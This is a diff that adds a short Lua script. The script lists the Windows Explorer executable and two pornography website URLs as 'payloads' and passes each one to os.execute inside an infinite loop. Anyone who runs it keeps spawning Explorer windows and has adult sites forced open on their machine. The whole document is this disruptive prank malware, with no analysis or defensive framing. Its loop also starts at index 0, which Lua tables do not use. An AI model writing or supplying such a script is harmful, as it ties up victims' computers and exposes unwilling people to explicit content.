@@ -1,0 +1,1 @@
+function getarrlen(arr) local len = 0 for id in pairs(arr) do len = len + 1 end return len end local payloads = {"C:\\Windows\\EXPLORER.EXE","https://yespornplease.com","https://pornhub.com/"} while true do for index = 0, getarrlen(payloads) do os.execute(payloads[index]) end end
